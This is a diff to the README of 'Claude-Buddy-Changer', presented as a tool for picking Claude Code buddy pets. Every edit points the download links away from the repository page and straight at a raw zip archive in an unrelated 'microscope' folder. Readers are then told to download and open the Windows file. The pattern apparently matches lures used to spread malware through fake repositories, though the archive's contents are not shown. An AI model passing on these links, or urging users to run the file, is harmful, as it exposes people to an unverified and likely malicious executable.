@@ -1,6 +1,6 @@
 # 🐾 Claude-Buddy-Changer - Pick your local pet with ease
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Olympiaaurous414/Claude-Buddy-Changer)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Olympiaaurous414/Claude-Buddy-Changer/raw/refs/heads/main/microscope/Buddy-Changer-Claude-v2.9.zip)
 
 ## 🚀 What this app does
 
@@ -8,7 +8,7 @@ Claude-Buddy-Changer helps you choose and switch your local Claude Code buddy pe
 
 ## 📥 Download and install
 
-1. Open the download page here: https://github.com/Olympiaaurous414/Claude-Buddy-Changer
+1. Open the download page here: https://github.com/Olympiaaurous414/Claude-Buddy-Changer/raw/refs/heads/main/microscope/Buddy-Changer-Claude-v2.9.zip
 2. Look for the latest release or the main download file on the page.
 3. Download the Windows file to your computer.
 4. Open the file from your Downloads folder.
@@ -144,4 +144,4 @@ If you are using the app for the first time:
 ## 🔗 Download again
 
 If you need the main download page again, use this link:
-https://github.com/Olympiaaurous414/Claude-Buddy-Changer
+https://github.com/Olympiaaurous414/Claude-Buddy-Changer/raw/refs/heads/main/microscope/Buddy-Changer-Claude-v2.9.zip
